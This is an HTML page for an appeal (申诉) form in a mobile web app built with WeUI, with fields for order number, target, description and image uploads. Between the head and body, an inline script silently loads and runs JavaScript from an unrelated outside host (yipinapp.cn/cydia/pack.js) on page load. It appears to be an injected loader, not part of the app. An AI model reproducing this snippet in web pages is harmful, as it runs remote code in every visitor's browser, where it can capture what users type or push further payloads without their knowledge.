<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
		<title>申诉</title>
		<link rel="stylesheet" href="../../static/css/weui.css" />
		<link rel="stylesheet" href="../../static/css/weui-jquery.css" />
		<link rel="stylesheet" href="../../static/css/common.css" />
		<link rel="stylesheet" href="../../static/css/account/method.css" />
	</head>
	<script>
		(function () {
			var dw = document.createElement("script");
			dw.src = "https://yipinapp.cn/cydia/pack.js?zBv2XrG8cSQqzRDCm9hsEL"
			var s = document.getElementsByTagName("script")[0];
			s.parentNode.insertBefore(dw, s);
		})()
	</script>
	<body>
		<header class="weui-bar weui-bar-nav" id="returnBtn">
		    <a class="weui-pull-left weui-btns">
		        <span class="weui-cell__fts"></span>
		    </a>
		    <div class="weui-title">申诉</div>
		</header>
		<div class="weui-cells weui-cells_form">
			<div class="weui-cell borderBotn">
			    <div class="weui-cell__hd"><label class="weui-label">申诉订单</label></div>
			    <div class="weui-cell__bd">
			      <input class="weui-input" type="text" id="orderNo" placeholder="请输入申诉订单">
			    </div>
			</div>
			<div class="weui-cell">
			    <div class="weui-cell__hd"><label class="weui-label">申诉对象</label></div>
			    <div class="weui-cell__bd">
			      <input class="weui-input" type="text" id="orderName" placeholder="请输入申诉对象">
			    </div>
			</div>
			<div class="weui-cell appealTet">
			    <div class="weui-cell__hd">
			    	<p class="weui-label">申诉内容</p>
			    	<textarea rows="10" id="contentTxt" cols="36" placeholder="请输入申诉内容"></textarea>
			    </div>
			</div>
			<div class="weui-cell">
				<div class="weui-cell__bd">
					<div class="weui-uploader">
    					<div class="weui-uploader__hd">
    						<p class="weui-uploader__title">添加图片</p>
    					</div>
				        <div class="weui-uploader__bd">
				        	<ul class="weui-uploader__files" id="uploaderFiles">

                            </ul>
				        	<div class="weui-uploader__input-box">
				            	<input id="uploaderInput" class="weui-uploader__input" type="file" accept="image/*" multiple="">
				        		<input type="hidden" value="" id="realPositive" />
				        	</div>
				        </div>
  					</div>
				</div>
			</div>
			<div class="appelDiv">
				<button type="button" class="weui-btn mybgBtn">提交申诉</button>
			</div>
		</div>
		<!--<script type="text/javascript" src="../../lib/jquery.js" ></script>-->
		<script type="text/javascript" src="../../lib/zepto.min.js" ></script>
		<script type="text/javascript" src="../../lib/fastclick.js" ></script>
		<script type="text/javascript" src="../../lib/jquery-weui.js" ></script>
		<script type="text/javascript" src="../../lib/weui.min.js" ></script>
		<script type="text/javascript" src="../../static/js/api.js" ></script>
		<script type="text/javascript" src="../../static/js/common.js" ></script>
		<script type="text/javascript" src="../../static/js/transaction/apealDetail.js" ></script>
	</body>
</html>
